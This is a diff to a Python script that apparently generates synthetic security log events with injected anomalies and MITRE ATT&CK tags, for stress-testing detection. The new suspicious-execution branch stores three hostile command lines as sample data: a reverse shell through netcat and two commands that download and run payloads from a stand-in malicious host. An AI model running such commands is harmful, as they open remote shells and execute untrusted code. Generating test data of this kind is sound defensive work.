@@ -4,43 +4,41 @@ import random
 import sys
 import time
 from datetime import datetime, timezone
-from typing import Dict
+from typing import Dict, List
+
+from mitre.mapping import mitre_hints_for_action
 
 USERS = ["alice", "bob", "charlie", "dana", "eve"]
-APPS = ["crm", "erp", "vpn", "sshd", "s3"]
+APPS = ["crm", "erp", "vpn", "sshd", "s3", "admin-console"]
 HOSTS = ["host-1", "host-2", "host-3"]
-ACTIONS = ["login", "logout", "file_access", "upload", "download"]
+BASE_ACTIONS = [
+    "login",
+    "logout",
+    "file_access",
+    "upload",
+    "download",
+    "process_exec",
+    "network_connect",
+]
 ANOMALY_RATE_DEFAULT = 0.2
-MITRE_ACTION_MAP = {
-    "login": {"tactics": ["Initial Access", "Credential Access"], "techniques": ["T1078"]},
-    "login_failed": {"tactics": ["Credential Access"], "techniques": ["T1110"]},
-    "file_access": {"tactics": ["Exfiltration"], "techniques": ["T1048"]},
-    "exfiltration": {"tactics": ["Exfiltration"], "techniques": ["T1041"]},
-    "process_exec": {"tactics": ["Execution"], "techniques": ["T1059"]},
-    "network_connect": {"tactics": ["Command and Control"], "techniques": ["T1071"]},
-}
 
 
 def generate_event() -> Dict:
+    """Generate a baseline event and optionally inject an anomaly."""
     user = random.choice(USERS)
     event: Dict = {
         "timestamp": datetime.now(timezone.utc).isoformat(),
         "user": user,
         "host": random.choice(HOSTS),
         "app": random.choice(APPS),
-        "action": random.choice(ACTIONS),
+        "action": random.choice(BASE_ACTIONS),
         "bytes": random.randint(100, 50000),
         "success": random.random() > 0.05,
     }
     # Inject anomalies more frequently to stress detection
     if random.random() < current_anomaly_rate():
         event = inject_anomaly(event)
-    # Attach MITRE hints based on action
-    mitre = MITRE_ACTION_MAP.get(event["action"], {"tactics": [], "techniques": []})
-    if mitre["tactics"] or mitre["techniques"]:
-        event["mitre_tactics"] = mitre["tactics"]
-        event["mitre_techniques"] = mitre["techniques"]
-    return event
+    return add_mitre_tags(event)
 
 
 def current_anomaly_rate() -> float:
@@ -52,19 +50,51 @@ def current_anomaly_rate() -> float:
 
 
 def inject_anomaly(event: Dict) -> Dict:
-    anomaly_type = random.choice(["exfil", "bruteforce", "rare_app"])
+    anomaly_type = random.choice(
+        ["exfil", "bruteforce", "c2", "lateral", "discovery", "suspicious_exec"]
+    )
     if anomaly_type == "exfil":
-        event["bytes"] = random.randint(300_000, 800_000)
+        event["bytes"] = random.randint(300_000, 900_000)
         event["action"] = "exfiltration"
         event["success"] = True
     elif anomaly_type == "bruteforce":
-        event["action"] = "login"
+        event["action"] = "login_failed"
         event["success"] = False
-        event["attempts"] = random.randint(5, 20)
-    else:
-        event["app"] = "admin-console"
-        event["action"] = "access_denied"
-        event["bytes"] = random.randint(1_000, 3_000)
+        event["attempts"] = random.randint(5, 25)
+        event["source_ip"] = f"10.0.0.{random.randint(10, 250)}"
+    elif anomaly_type == "c2":
+        event["action"] = "network_connect"
+        event["destination_ip"] = f"203.0.113.{random.randint(1, 254)}"
+        event["destination_port"] = random.choice([4444, 8080, 1337])
+        event["protocol"] = "TCP"
+        event["bytes"] = random.randint(50_000, 150_000)
+    elif anomaly_type == "lateral":
+        event["action"] = "lateral_movement"
+        event["target_host"] = random.choice(HOSTS)
+        event["protocol"] = random.choice(["SMB", "RDP", "SSH"])
+    elif anomaly_type == "discovery":
+        event["action"] = "discovery_scan"
+        event["dest_range"] = f"10.0.{random.randint(0,5)}.0/24"
+        event["scanned_ports"] = random.sample([22, 80, 443, 445, 3389], k=3)
+    else:  # suspicious_exec
+        event["action"] = "process_exec"
+        event["process_name"] = random.choice(["powershell.exe", "cmd.exe", "bash"])
+        event["command_line"] = random.choice(
+            [
+                "Invoke-WebRequest http://malicious.com/payload.exe",
+                "nc -e /bin/sh 203.0.113.10 4444",
+                "curl http://malicious.com/run.sh | bash",
+            ]
+        )
+    return event
+
+
+def add_mitre_tags(event: Dict) -> Dict:
+    """Attach MITRE tactics/techniques when available."""
+    hints = mitre_hints_for_action(event.get("action", ""))
+    if hints["tactics"] or hints["techniques"]:
+        event["mitre_tactics"] = hints["tactics"]
+        event["mitre_techniques"] = hints["techniques"]
     return event
 
 
